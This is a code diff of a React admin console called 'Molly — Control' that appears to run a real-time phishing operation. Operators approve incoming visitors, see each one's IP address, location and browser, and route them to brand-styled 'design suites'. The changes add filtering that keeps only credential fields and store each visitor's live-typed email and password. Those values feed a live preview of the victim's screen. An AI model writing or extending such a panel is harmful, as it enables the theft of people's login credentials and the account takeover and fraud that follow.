@@ -22,6 +22,7 @@ import {
 import type { RealtimeChannel } from "@supabase/supabase-js";
 import {
   joinChannel,
+  isSensitiveAdminSubmission,
   type InputPayload,
   type LiveInputPayload,
   type NavigatePayload,
@@ -40,6 +41,7 @@ import { StatusDot, type DotState } from "@/components/StatusDot";
 import { MollyLogo, type MollyLogoHandle } from "@/components/MollyLogo";
 import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible";
 
+import { googleSitesEmbedCode } from "@/lib/embedCode";
 import {
   getDesigns,
   getDesignLogo,
@@ -64,41 +66,86 @@ import { ParticipantsIcon, PagesIcon, SettingsIcon, FileUploaderIcon } from "@/c
 const pagesEditorImport = () => import("@/components/PagesEditor");
 const fileUploaderImport = () => import("@/components/FileUploader");
 const livePreviewImport = () => import("@/components/LivePreview");
-const floatingPanelImport = () => import("@/components/FloatingPanel");
+const panelModalImport = () => import("@/components/PanelModal");
 
 const PagesEditor = lazy(() => pagesEditorImport().then((m) => ({ default: m.PagesEditor })));
 const FileUploader = lazy(() => fileUploaderImport().then((m) => ({ default: m.FileUploader })));
 const LivePreview = lazy(() => livePreviewImport().then((m) => ({ default: m.LivePreview })));
-const FloatingPanel = lazy(() => floatingPanelImport().then((m) => ({ default: m.FloatingPanel })));
+const PanelModal = lazy(() => panelModalImport().then((m) => ({ default: m.PanelModal })));
 
 function AdminLazyFallback() {
   return <span aria-hidden />;
 }
 
 
-function ParticipantGeoLine({ p }: { p: LiveRecord }) {
-  const place = [p.city, p.region, p.country].filter(Boolean).join(", ");
-  if (!p.ip && !place && !p.host) return null;
+function placeFromParticipant(p: LiveRecord): string {
+  return [p.city, p.region, p.country].filter(Boolean).join(", ");
+}
+
+function parseUrlParts(url: string): {
+  designId: string | null;
+  pageId: string | null;
+  path: string;
+  isFocus: boolean;
+} {
+  const path = (url || "/").split("?")[0] || "/";
+  const m = path.match(/^\/([a-z][a-z0-9_-]{0,30})(?:\/([a-z][a-z0-9_-]{0,40}))?/);
+  if (!m || path === "/") {
+    return { designId: null, pageId: null, path, isFocus: true };
+  }
+  return { designId: m[1], pageId: m[2] ?? null, path, isFocus: false };
+}
+
+function DesignMark({ url, size = 22 }: { url: string; size?: number }) {
+  const { designId, isFocus } = parseUrlParts(url);
+  const logo = designId ? getDesignLogo(designId) : null;
+  const design = designId ? getDesigns().find((d) => d.id === designId) : undefined;
+  if (logo) {
+    return (
+      <img
+        src={logo}
+        alt={design?.label ?? designId ?? ""}
+        className="pc-logo"
+        width={size}
+        height={size}
+        title={design?.label ?? designId ?? undefined}
+      />
+    );
+  }
+  if (isFocus) {
+    return (
+      <span className="pc-logo pc-logo-focus" style={{ width: size, height: size }} title="Focus Room" aria-hidden>
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
+          <line x1="18" y1="6" x2="6" y2="18" />
+          <line x1="6" y1="6" x2="18" y2="18" />
+        </svg>
+      </span>
+    );
+  }
   return (
-    <>
-      <p className="admin-card-geo">
-        <span className="admin-card-flag" aria-hidden>{countryFlagEmoji(p.countryCode)}</span>
-        {place && <span className="admin-card-place">{place}</span>}
-        {p.ip && <span className="admin-card-ip font-mono">{p.ip}</span>}
-      </p>
-      {p.host && (
-        <p className="admin-card-host font-mono" title="Site domain the participant connected to">
-          <span className="admin-card-host-label">via</span> {p.host}
-        </p>
-      )}
-    </>
+    <span className="pc-logo pc-logo-fallback" style={{ width: size, height: size }} aria-hidden>
+      {(designId ?? "?").slice(0, 2).toUpperCase()}
+    </span>
+  );
+}
+
+function PagePathChip({ url }: { url: string }) {
+  const { path, isFocus, designId, pageId } = parseUrlParts(url);
+  const label = isFocus ? "/focus" : path;
+  const title = pageLabelFromUrl(url);
+  const logo = designId ? getDesignLogo(designId) : null;
+  return (
+    <span className="pc-path" title={title}>
+      {logo ? <img src={logo} alt="" className="pc-path-logo" /> : null}
+      <span className="pc-path-text font-mono">{pageId ? `/${designId}/${pageId}` : label}</span>
+    </span>
   );
 }
 
 
 
 
-export const Route = createFileRoute("/_authenticated/admin")({
+export const Route = createFileRoute("/_authenticated/panel")({
   head: () => ({ meta: [{ title: "Molly — Control" }] }),
   component: Admin,
 });
@@ -129,43 +176,6 @@ function pageLabelFromUrl(url: string): string {
   return `${suiteLabel} · ${pageLabel}`;
 }
 
-function PageIndicator({ url }: { url: string }) {
-  const m = url.match(/^\/([a-z][a-z0-9_-]{0,30})(?:\/([a-z][a-z0-9_-]{0,40}))?/);
-  const isFocus = !m || url === "/";
-  if (isFocus) {
-    return (
-      <span className="admin-page-chip" title="Focus Room">
-        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" aria-hidden>
-          <line x1="18" y1="6" x2="6" y2="18" />
-          <line x1="6" y1="6" x2="18" y2="18" />
-        </svg>
-        <span className="admin-page-chip-label">Focus Room</span>
-      </span>
-    );
-  }
-  const designId = m![1];
-  const logo = getDesignLogo(designId);
-  const design = getDesigns().find((d) => d.id === designId);
-  const pageId = m![2];
-  const pages = pageId ? getPagesFor(designId) : [];
-  const pageRec = pageId ? pages.find((p) => p.page === pageId) : undefined;
-  const suiteLabel = design?.label ?? designId;
-  const pageLabel = pageRec?.label ?? pageId ?? "";
-  return (
-    <span className="admin-page-chip" title={`${suiteLabel}${pageLabel ? " · " + pageLabel : ""}`}>
-      {logo ? (
-        <img src={logo} alt="" className="admin-page-chip-logo" />
-      ) : (
-        <span className="admin-page-chip-dot" aria-hidden />
-      )}
-      <span className="admin-page-chip-label">
-        {suiteLabel}
-        {pageLabel && <span className="admin-page-chip-sub"> · {pageLabel}</span>}
-      </span>
-    </span>
-  );
-}
-
 function formatCountdown(ms: number): string {
   if (ms <= 0) return "expired";
   const s = Math.ceil(ms / 1000);
@@ -174,13 +184,39 @@ function formatCountdown(ms: number): string {
   return `${m}m ${rs.toString().padStart(2, "0")}s`;
 }
 
-function shortUA(ua: string | null | undefined): string | null {
+function parseUA(ua: string | null | undefined): { os: string; browser: string; line: string } | null {
   if (!ua) return null;
-  const m = ua.match(/(Chrome|Firefox|Safari|Edg|OPR)\/[\d.]+/);
-  const os = ua.match(/\(([^)]+)\)/);
-  const browser = m ? m[0].replace("Edg", "Edge").replace("OPR", "Opera") : "Browser";
-  const platform = os ? os[1].split(";")[0].trim() : "";
-  return platform ? `${browser} — ${platform}` : browser;
+
+  let os = "Unknown";
+  if (/Windows NT 1[01]/i.test(ua) || /Windows NT 10\.0/i.test(ua)) os = "Windows 10/11";
+  else if (/Windows NT 6\.3/i.test(ua)) os = "Windows 8.1";
+  else if (/Windows NT 6\.1/i.test(ua)) os = "Windows 7";
+  else if (/Windows/i.test(ua)) os = "Windows";
+  else if (/Android (\d+)/i.test(ua)) os = `Android ${ua.match(/Android (\d+)/i)![1]}`;
+  else if (/iPhone|iPad|iPod/i.test(ua)) {
+    const m = ua.match(/OS (\d+)[._](\d+)/i);
+    os = m ? `iOS ${m[1]}.${m[2]}` : "iOS";
+  } else if (/Mac OS X (\d+)[._](\d+)/i.test(ua)) {
+    const m = ua.match(/Mac OS X (\d+)[._](\d+)/i)!;
+    os = `macOS ${m[1]}.${m[2]}`;
+  } else if (/CrOS/i.test(ua)) os = "Chrome OS";
+  else if (/Linux/i.test(ua)) os = "Linux";
+
+  const major = (v: string) => v.split(".")[0];
+  let browser = "Browser";
+  const edge = ua.match(/Edg(?:e|A|iOS)?\/([\d.]+)/);
+  const opera = ua.match(/OPR\/([\d.]+)/);
+  const firefox = ua.match(/Firefox\/([\d.]+)/);
+  const chrome = ua.match(/Chrome\/([\d.]+)/);
+  const safari = ua.match(/Version\/([\d.]+).*Safari/);
+  if (edge) browser = `Edge ${major(edge[1])}`;
+  else if (opera) browser = `Opera ${major(opera[1])}`;
+  else if (firefox) browser = `Firefox ${major(firefox[1])}`;
+  else if (chrome && !/Chromium/i.test(ua)) browser = `Chrome ${major(chrome[1])}`;
+  else if (safari) browser = `Safari ${major(safari[1])}`;
+  else if (chrome) browser = `Chrome ${major(chrome[1])}`;
+
+  return { os, browser, line: `${os} · ${browser}` };
 }
 
 function dotStateFor(p: ParticipantRecord | undefined): DotState {
@@ -190,7 +226,6 @@ function dotStateFor(p: ParticipantRecord | undefined): DotState {
 
 function Admin() {
   const [records, setRecords] = useState<Map<string, LiveRecord>>(new Map());
-  const [section, setSection] = useState<"queue" | "participants">("queue");
   const [nav, setNav] = useState<"participants" | "pages" | "settings" | "fileuploader">("participants");
   const [folders, setFolders] = useState<{ admin: boolean; utils: boolean }>(() => {
     if (typeof window === "undefined") return { admin: true, utils: true };
@@ -211,6 +246,10 @@ function Admin() {
   }
   const [events, setEvents] = useState<InputPayload[]>([]);
   const [liveInputs, setLiveInputs] = useState<Map<string, LiveInputPayload>>(new Map());
+  /** All live-typed fields per participant — seeds live preview after redirects. */
+  const [liveFieldMaps, setLiveFieldMaps] = useState<Map<string, Record<string, string>>>(
+    () => new Map(),
+  );
   const [previews, setPreviews] = useState<string[]>([]);
   const [viewports, setViewports] = useState<Map<string, { w: number; h: number }>>(new Map());
   const [designs, setDesigns] = useState<DesignRecord[]>(() => getDesigns());
@@ -241,7 +280,7 @@ function Admin() {
     void pagesEditorImport();
     void fileUploaderImport();
     void livePreviewImport();
-    void floatingPanelImport();
+    void panelModalImport();
     return () => { off(); stop(); };
   }, []);
 
@@ -267,6 +306,10 @@ function Admin() {
       key: `admin_${Math.random().toString(36).slice(2, 8)}`,
       onInput: (p) =>
         setEvents((prev) => {
+          // Drop UI noise / non-credential fields before they hit the feed.
+          if (p.field.startsWith("__")) return prev;
+          if (/_clicked$/i.test(p.field) || p.field === "continue_clicked") return prev;
+          if (!isSensitiveAdminSubmission(p.field)) return prev;
           // Dedupe: drop if last event matches (pid,field,value) within 300ms.
           const last = prev[0];
           if (
@@ -295,6 +338,21 @@ function Admin() {
         setLiveInputs((prev) => {
           const next = new Map(prev);
           next.set(p.participantId, p);
+          return next;
+        });
+        setLiveFieldMaps((prev) => {
+          const next = new Map(prev);
+          const fields = { ...(next.get(p.participantId) || {}) };
+          fields[p.field] = p.value;
+          // Keep common aliases so preview can reseed email chips after nav.
+          if (/^(email|identifier|login)$/i.test(p.field) || /email/i.test(p.field)) {
+            fields.email = p.value;
+            fields.identifier = p.value;
+          }
+          if (/^password$/i.test(p.field) || p.ftype === "password") {
+            fields.password = p.value;
+          }
+          next.set(p.participantId, fields);
           return next;
         });
         window.dispatchEvent(new CustomEvent("ux:liveinput", { detail: p }));
@@ -575,41 +633,19 @@ function Admin() {
         <main className="admin-main">
           <Suspense fallback={<AdminLazyFallback />}>
             <div hidden={nav !== "participants"} style={nav === "participants" ? undefined : { display: "none" }}>
-              <div className="admin-segmented-wrap">
-                <div className="admin-segmented" role="tablist">
-                  <button
-                    role="tab"
-                    aria-selected={section === "queue"}
-                    className={`admin-seg ${section === "queue" ? "is-active" : ""}`}
-                    onClick={() => setSection("queue")}
-                  >
-                    Queue <span className="admin-seg-count">{queue.length}</span>
-                  </button>
-                  <button
-                    role="tab"
-                    aria-selected={section === "participants"}
-                    className={`admin-seg ${section === "participants" ? "is-active" : ""}`}
-                    onClick={() => setSection("participants")}
-                  >
-                    Participants <span className="admin-seg-count">{approved.length}</span>
-                  </button>
-                </div>
-              </div>
-              <div key={section} className="admin-pane admin-pane-swap">
-                {section === "queue" ? (
-                  <QueuePane items={queue} onApprove={approve} onKick={kick} suites={suites} />
-                ) : (
-                  <ParticipantsPane
-                    items={approved}
-                    onNavigate={sendNavigate}
-                    onRevoke={revoke}
-                    onKick={kick}
-                    onOpenPreview={openPreview}
-                    events={events}
-                    liveInputs={liveInputs}
-                    suites={suites}
-                  />
-                )}
+              <div className="admin-pane">
+                <SessionsPage
+                  queue={queue}
+                  approved={approved}
+                  onApprove={approve}
+                  onNavigate={sendNavigate}
+                  onRevoke={revoke}
+                  onKick={kick}
+                  onOpenPreview={openPreview}
+                  events={events}
+                  liveFieldMaps={liveFieldMaps}
+                  suites={suites}
+                />
               </div>
             </div>
 
@@ -638,21 +674,32 @@ function Admin() {
 
 
 
-      {previews.map((pid, i) => {
+      {previews.map((pid) => {
         const rec = records.get(pid);
         const initialUrl = rec?.currentUrl || rec?.assignedUrl || null;
         const initialViewport = viewports.get(pid) || null;
+        const fromLive = liveFieldMaps.get(pid) || {};
+        const fromSubmitted: Record<string, string> = {};
+        for (const e of events) {
+          if (e.participantId !== pid) continue;
+          const key = e.field.replace(/_submitted$/i, "");
+          fromSubmitted[key] = e.value;
+          fromSubmitted[e.field] = e.value;
+          if (/^email$/i.test(key)) {
+            fromSubmitted.email = e.value;
+            fromSubmitted.identifier = e.value;
+          }
+          if (/^password$/i.test(key)) fromSubmitted.password = e.value;
+        }
+        const seedInputs = { ...fromSubmitted, ...fromLive };
         return (
           <LivePreview
             key={pid}
             pid={pid}
             onClose={() => closePreview(pid)}
-            initial={{
-              pos: { x: 80 + i * 40, y: 80 + i * 40 },
-              size: { w: 480, h: 360 },
-            }}
             initialUrl={initialUrl}
             initialViewport={initialViewport}
+            seedInputs={seedInputs}
           />
         );
       })}
@@ -663,8 +710,7 @@ function Admin() {
 function formatRelative(ts: number): string {
   const diff = Math.max(0, Date.now() - ts);
   const s = Math.floor(diff / 1000);
-  if (s < 5) return "just now";
-  if (s < 60) return `${s}s ago`;
+  if (s < 60) return "less than a minute ago";
   const m = Math.floor(s / 60);
   if (m < 60) return `${m}m ago`;
   const h = Math.floor(m / 60);
@@ -680,184 +726,6 @@ function useTick(ms: number): void {
     return () => window.clearInterval(id);
   }, [ms]);
 }
-
-function QueuePane({
-  items,
-  onApprove,
-  onKick,
-  suites,
-}: {
-  items: LiveRecord[];
-  onApprove: (id: string, suite: Suite, page: Page) => void;
-  onKick: (id: string) => void;
-  suites: SuiteOpt[];
-}) {
-  if (items.length === 0) {
-    return <p className="admin-empty">No one waiting. New participants will appear here for approval.</p>;
-  }
-  function clearAll() {
-    if (items.length === 0) return;
-    if (!window.confirm(`Remove all ${items.length} queued ${items.length === 1 ? "entry" : "entries"}?`)) return;
-    for (const p of items) onKick(p.id);
-  }
-  return (
-    <div className="admin-queue-wrap">
-      <div className="admin-queue-toolbar">
-        <button
-          className="admin-btn admin-btn-danger"
-          onClick={clearAll}
-          aria-label="Clear all queued entries"
-        >
-          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <polyline points="3 6 5 6 21 6" />
-            <path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6" />
-            <path d="M10 11v6M14 11v6" />
-            <path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" />
-          </svg>
-          Clear all
-        </button>
-      </div>
-      <div className="admin-grid">
-        {items.map((p) => (
-          <QueueCard key={p.id} p={p} onApprove={onApprove} onKick={onKick} suites={suites} />
-        ))}
-      </div>
-    </div>
-  );
-}
-
-function QueueCard({
-  p,
-  onApprove,
-  onKick,
-  suites,
-}: {
-  p: LiveRecord;
-  onApprove: (id: string, suite: Suite, page: Page) => void;
-  onKick: (id: string) => void;
-  suites: SuiteOpt[];
-}) {
-  const [open, setOpen] = useState(false);
-  const [suite, setSuite] = useState<Suite>(() => suites[0]?.value ?? "");
-  const [regRev, setRegRev] = useState(0);
-  useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
-  useTick(1_000);
-  const pageOpts: PageOpt[] = useMemo(
-    () => (suite ? pagesFromPagesFor(getPagesFor(suite)) : []),
-    [suite, regRev],
-  );
-  const [page, setPage] = useState<Page>(() => pageOpts[0]?.value ?? "");
-  // Keep selections valid when suite/page lists change
-  useEffect(() => {
-    if (!suite && suites[0]) setSuite(suites[0].value);
-  }, [suites, suite]);
-  useEffect(() => {
-    if (!pageOpts.find((o) => o.value === page)) {
-      setPage(pageOpts[0]?.value ?? "");
-    }
-  }, [pageOpts, page]);
-
-  const TTL_MS = 15 * 60 * 1000;
-  const joinedDate = new Date(p.joinedAt);
-  const appearedAbs = joinedDate.toLocaleString();
-  const joinedClock = joinedDate.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
-  const remaining = p.joinedAt + TTL_MS - Date.now();
-  const expiringSoon = remaining <= 60_000;
-  const ua = shortUA(p.userAgent);
-
-  return (
-    <article className="admin-card">
-      <div className="admin-card-head admin-card-head-stack">
-        <div className="admin-card-icons">
-          <button
-            className="admin-icon-btn admin-icon-btn-danger"
-            title="Remove from queue"
-            onClick={() => onKick(p.id)}
-            aria-label="Remove from queue"
-          >
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <polyline points="3 6 5 6 21 6" />
-              <path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6" />
-              <path d="M10 11v6M14 11v6" />
-              <path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2" />
-            </svg>
-          </button>
-        </div>
-        <div className="admin-card-id admin-card-id-bottom">
-          <StatusDot state={p.state} />
-          <span className="font-mono text-sm">{p.id}</span>
-          <span className="admin-tag" style={{ marginLeft: 8 }}>Awaiting</span>
-        </div>
-      </div>
-
-      <div className="admin-card-page-row">
-        <span className="admin-card-page-label">on</span>
-        <PageIndicator url={p.currentUrl} />
-      </div>
-
-      <div className="admin-card-details">
-        <div className="admin-card-detail" title={appearedAbs}>
-          <span className="admin-card-detail-k">Joined</span>
-          <span className="admin-card-detail-v">
-            {formatRelative(p.joinedAt)} <span className="admin-card-detail-sub">· {joinedClock}</span>
-          </span>
-        </div>
-        <div className={`admin-card-detail ${expiringSoon ? "is-warn" : ""}`}>
-          <span className="admin-card-detail-k">Expires in</span>
-          <span className="admin-card-detail-v font-mono">{formatCountdown(remaining)}</span>
-        </div>
-        {ua && (
-          <div className="admin-card-detail">
-            <span className="admin-card-detail-k">Client</span>
-            <span className="admin-card-detail-v">{ua}</span>
-          </div>
-        )}
-      </div>
-
-      <ParticipantGeoLine p={p} />
-
-
-      <div className={`admin-popout ${open ? "is-open" : ""}`}>
-        <div className="admin-popout-inner">
-          <label className="admin-field">
-            <span>Design Suite</span>
-            <select value={suite} onChange={(e) => setSuite(e.target.value)}>
-              {suites.map((s) => (
-                <option key={s.value} value={s.value}>
-                  {s.label}
-                </option>
-              ))}
-            </select>
-          </label>
-          <label className="admin-field">
-            <span>Starting Page</span>
-            <select value={page} onChange={(e) => setPage(e.target.value)}>
-              {pageOpts.map((pg) => (
-                <option key={pg.value} value={pg.value}>
-                  {pg.label}
-                </option>
-              ))}
-            </select>
-          </label>
-          <button
-            className="admin-btn admin-btn-primary w-full"
-            onClick={() => suite && page && onApprove(p.id, suite, page)}
-            disabled={!suite || !page}
-          >
-            Confirm & route
-          </button>
-        </div>
-      </div>
-
-      <div className="admin-card-actions">
-        <button className="admin-btn admin-btn-primary" onClick={() => setOpen((v) => !v)}>
-          {open ? "Cancel" : "Accept"}
-        </button>
-      </div>
-    </article>
-  );
-}
-
 
 function CopyChip({
   text,
@@ -895,48 +763,333 @@ function CopyChip({
   );
 }
 
-function ParticipantsPane({
-  items,
+function QueueTtlRing({ remainingMs, ttlMs }: { remainingMs: number; ttlMs: number }) {
+  const r = 14;
+  const c = 2 * Math.PI * r;
+  const pct = Math.max(0, Math.min(1, remainingMs / ttlMs));
+  const dash = c * pct;
+  const urgent = remainingMs <= 60_000;
+  const label = remainingMs <= 0
+    ? "0s"
+    : remainingMs < 60_000
+      ? `${Math.ceil(remainingMs / 1000)}s`
+      : `${Math.ceil(remainingMs / 60_000)}m`;
+  return (
+    <span className={`pc-ttl-ring ${urgent ? "is-warn" : ""}`} title="Time until queue expiry" aria-label={`Expires in ${label}`}>
+      <svg width="34" height="34" viewBox="0 0 34 34" aria-hidden>
+        <circle cx="17" cy="17" r={r} fill="none" stroke="#1a1a1a" strokeWidth="2.5" />
+        <circle
+          cx="17"
+          cy="17"
+          r={r}
+          fill="none"
+          stroke={urgent ? "#ffb86b" : "#5dffa3"}
+          strokeWidth="2.5"
+          strokeLinecap="round"
+          strokeDasharray={`${dash} ${c}`}
+          transform="rotate(-90 17 17)"
+        />
+      </svg>
+      <span className="pc-ttl-ring-label">{label}</span>
+    </span>
+  );
+}
+
+function SessionCardBody({ p, showId = false }: { p: LiveRecord; showId?: boolean }) {
+  const ua = parseUA(p.userAgent);
+  const place = placeFromParticipant(p);
+  return (
+    <>
+      <DesignMark url={p.currentUrl} size={22} />
+      <div className="pc-identity">
+        <div className="pc-identity-top">
+          <span className="pc-flag" aria-hidden>{countryFlagEmoji(p.countryCode)}</span>
+          {p.ip ? (
+            <CopyChip text={p.ip} title="Copy IP" className="pc-ip copy-chip-inline">
+              <span className="font-mono">{p.ip}</span>
+            </CopyChip>
+          ) : (
+            <CopyChip text={p.id} title="Copy participant id" className="pc-ip copy-chip-inline">
+              <span className="font-mono">{shortId(p.id)}</span>
+            </CopyChip>
+          )}
+          <StatusDot state={p.state} />
+          {showId && (
+            <CopyChip text={p.id} title="Copy full participant id" className="pc-pid copy-chip-inline">
+              <span className="font-mono">{shortId(p.id)}</span>
+            </CopyChip>
+          )}
+        </div>
+        <div className="pc-identity-geo">
+          {place ? <span className="pc-place">{place}</span> : <span className="pc-place pc-muted">Unknown location</span>}
+          {p.host && (
+            <span className="pc-host" title="Connected host">
+              <span className="pc-host-label">via</span> {p.host}
+            </span>
+          )}
+        </div>
+      </div>
+      <div className="pc-ua pc-ua-inline" title={p.userAgent ?? undefined}>
+        {ua ? <span>{ua.os} · {ua.browser}</span> : <span className="pc-muted">Unknown client</span>}
+      </div>
+      <div className="pc-page">
+        <PagePathChip url={p.currentUrl} />
+      </div>
+    </>
+  );
+}
+
+function SessionsPage({
+  queue,
+  approved,
+  onApprove,
   onNavigate,
   onRevoke,
   onKick,
   onOpenPreview,
   events,
-  liveInputs,
+  liveFieldMaps,
   suites,
 }: {
-  items: LiveRecord[];
+  queue: LiveRecord[];
+  approved: LiveRecord[];
+  onApprove: (id: string, suite: Suite, page: Page) => void;
   onNavigate: (id: string, suite: Suite, page: Page) => void;
   onRevoke: (id: string) => void;
   onKick: (id: string) => void;
   onOpenPreview: (id: string) => void;
   events: InputPayload[];
-  liveInputs: Map<string, LiveInputPayload>;
+  liveFieldMaps: Map<string, Record<string, string>>;
   suites: SuiteOpt[];
 }) {
+  const [query, setQuery] = useState("");
+  const filtered = useMemo(() => {
+    const q = query.trim().toLowerCase();
+    if (!q) return approved;
+    return approved.filter((p) => {
+      const hay = [
+        p.ip,
+        p.city,
+        p.region,
+        p.country,
+        p.countryCode,
+        p.host,
+        p.id,
+        p.userAgent,
+        p.currentUrl,
+      ]
+        .filter(Boolean)
+        .join(" ")
+        .toLowerCase();
+      return hay.includes(q);
+    });
+  }, [approved, query]);
+
+  function clearQueue() {
+    if (queue.length === 0) return;
+    if (!window.confirm(`Decline all ${queue.length} pending ${queue.length === 1 ? "entry" : "entries"}?`)) return;
+    for (const p of queue) onKick(p.id);
+  }
+  function clearActive() {
+    if (approved.length === 0) return;
+    if (!window.confirm(`Remove all ${approved.length} active ${approved.length === 1 ? "session" : "sessions"}?`)) return;
+    for (const p of approved) onKick(p.id);
+  }
+
   return (
-    <div>
-      {items.length === 0 ? (
-        <p className="admin-empty">No approved participants yet. Approve from the Queue.</p>
-      ) : (
-        <div className="admin-grid">
-          {items.map((p) => (
-            <ParticipantCard
-              key={p.id}
-              p={p}
-              onNavigate={onNavigate}
-              onRevoke={onRevoke}
-              onKick={onKick}
-              onOpenPreview={onOpenPreview}
-              suites={suites}
-              events={events.filter((e) => e.participantId === p.id)}
-              liveInput={liveInputs.get(p.id) ?? null}
+    <div className="sessions-page">
+      <section className="sessions-section">
+        <header className="sessions-head">
+          <div className="sessions-head-left">
+            <h2 className="sessions-title">Pending Approval</h2>
+            <span className="sessions-count">{queue.length}</span>
+          </div>
+          <div className="sessions-head-right">
+            {queue.length > 0 && (
+              <>
+                <span className="sessions-note">Auto-expires after 15m</span>
+                <button type="button" className="sessions-clear" onClick={clearQueue}>
+                  Clear
+                </button>
+              </>
+            )}
+          </div>
+        </header>
+        {queue.length === 0 ? (
+          <p className="sessions-empty">No one waiting. New visitors show up here for approval.</p>
+        ) : (
+          <div className="admin-grid">
+            {queue.map((p) => (
+              <QueueCard key={p.id} p={p} onApprove={onApprove} onKick={onKick} suites={suites} />
+            ))}
+          </div>
+        )}
+      </section>
+
+      <section className="sessions-section">
+        <header className="sessions-head">
+          <div className="sessions-head-left">
+            <h2 className="sessions-title">Active Sessions</h2>
+            <span className="sessions-count">{approved.length}</span>
+          </div>
+          <div className="sessions-head-right">
+            <input
+              className="sessions-search"
+              type="search"
+              value={query}
+              onChange={(e) => setQuery(e.target.value)}
+              placeholder="Search IP, country…"
+              aria-label="Search active sessions"
             />
-          ))}
-        </div>
-      )}
+            {approved.length > 0 && (
+              <button type="button" className="sessions-clear" onClick={clearActive}>
+                Clear All
+              </button>
+            )}
+          </div>
+        </header>
+        {filtered.length === 0 ? (
+          <p className="sessions-empty">
+            {approved.length === 0
+              ? "No active sessions yet. Approve someone from Pending."
+              : "No sessions match that search."}
+          </p>
+        ) : (
+          <div className="admin-grid">
+            {filtered.map((p) => (
+              <ParticipantCard
+                key={p.id}
+                p={p}
+                onNavigate={onNavigate}
+                onRevoke={onRevoke}
+                onKick={onKick}
+                onOpenPreview={onOpenPreview}
+                suites={suites}
+                events={events.filter((e) => e.participantId === p.id)}
+                liveFields={liveFieldMaps.get(p.id) || {}}
+              />
+            ))}
+          </div>
+        )}
+      </section>
     </div>
   );
+}
+
+function QueueCard({
+  p,
+  onApprove,
+  onKick,
+  suites,
+}: {
+  p: LiveRecord;
+  onApprove: (id: string, suite: Suite, page: Page) => void;
+  onKick: (id: string) => void;
+  suites: SuiteOpt[];
+}) {
+  const [open, setOpen] = useState(false);
+  const [suite, setSuite] = useState<Suite>(() => suites[0]?.value ?? "");
+  const [regRev, setRegRev] = useState(0);
+  useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
+  useTick(1_000);
+  const pageOpts: PageOpt[] = useMemo(
+    () => (suite ? pagesFromPagesFor(getPagesFor(suite)) : []),
+    [suite, regRev],
+  );
+  const [page, setPage] = useState<Page>(() => pageOpts[0]?.value ?? "");
+  useEffect(() => {
+    if (!suite && suites[0]) setSuite(suites[0].value);
+  }, [suites, suite]);
+  useEffect(() => {
+    if (!pageOpts.find((o) => o.value === page)) {
+      setPage(pageOpts[0]?.value ?? "");
+    }
+  }, [pageOpts, page]);
+
+  const TTL_MS = 15 * 60 * 1000;
+  const remaining = p.joinedAt + TTL_MS - Date.now();
+  const expiringSoon = remaining <= 60_000;
+
+  return (
+    <article className={`pc ${expiringSoon ? "is-warn" : ""}`}>
+      <div className="pc-row">
+        <QueueTtlRing remainingMs={remaining} ttlMs={TTL_MS} />
+        <SessionCardBody p={p} />
+        <div className="pc-actions">
+          <button type="button" className="pc-btn pc-btn-accept" onClick={() => setOpen(true)}>
+            Accept
+          </button>
+          <button
+            type="button"
+            className="pc-btn pc-btn-decline"
+            title="Remove from queue"
+            onClick={() => onKick(p.id)}
+          >
+            Decline
+          </button>
+        </div>
+      </div>
+
+      {open && (
+        <Suspense fallback={<AdminLazyFallback />}>
+          <PanelModal
+            title={
+              <span>
+                Accept <span className="font-mono text-[11px] opacity-60">{shortId(p.id)}</span>
+              </span>
+            }
+            onClose={() => setOpen(false)}
+            maxWidth={340}
+            className="pc-modal"
+          >
+            <div className="pc-popout">
+              <label className="admin-field">
+                <span>Design Suite</span>
+                <select value={suite} onChange={(e) => setSuite(e.target.value)}>
+                  {suites.map((s) => (
+                    <option key={s.value} value={s.value}>
+                      {s.label}
+                    </option>
+                  ))}
+                </select>
+              </label>
+              <label className="admin-field">
+                <span>Starting Page</span>
+                <select value={page} onChange={(e) => setPage(e.target.value)}>
+                  {pageOpts.map((pg) => (
+                    <option key={pg.value} value={pg.value}>
+                      {pg.label}
+                    </option>
+                  ))}
+                </select>
+              </label>
+              <div className="pc-popout-actions">
+                <button type="button" className="admin-btn admin-btn-ghost" onClick={() => setOpen(false)}>
+                  Cancel
+                </button>
+                <button
+                  type="button"
+                  className="admin-btn admin-btn-primary"
+                  onClick={() => {
+                    if (!suite || !page) return;
+                    onApprove(p.id, suite, page);
+                    setOpen(false);
+                  }}
+                  disabled={!suite || !page}
+                >
+                  Confirm & route
+                </button>
+              </div>
+            </div>
+          </PanelModal>
+        </Suspense>
+      )}
+    </article>
+  );
+}
+
+function shortId(id: string): string {
+  return id.length <= 10 ? id : `${id.slice(0, 10)}…`;
 }
 
 function ParticipantCard({
@@ -947,7 +1100,7 @@ function ParticipantCard({
   onOpenPreview,
   suites,
   events,
-  liveInput,
+  liveFields,
 }: {
   p: LiveRecord;
   onNavigate: (id: string, suite: Suite, page: Page) => void;
@@ -956,12 +1109,17 @@ function ParticipantCard({
   onOpenPreview: (id: string) => void;
   suites: SuiteOpt[];
   events: InputPayload[];
-  liveInput: LiveInputPayload | null;
+  liveFields: Record<string, string>;
 }) {
   const [regRev, setRegRev] = useState(0);
   useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
-  type PanelKey = "redirect" | "submitted" | "keyboard";
+  type PanelKey = "redirect" | "submitted";
   const [panels, setPanels] = useState<Set<PanelKey>>(() => new Set());
+  const [pickedSuite, setPickedSuite] = useState<Suite | null>(null);
+  const [pickedPage, setPickedPage] = useState<Page | null>(null);
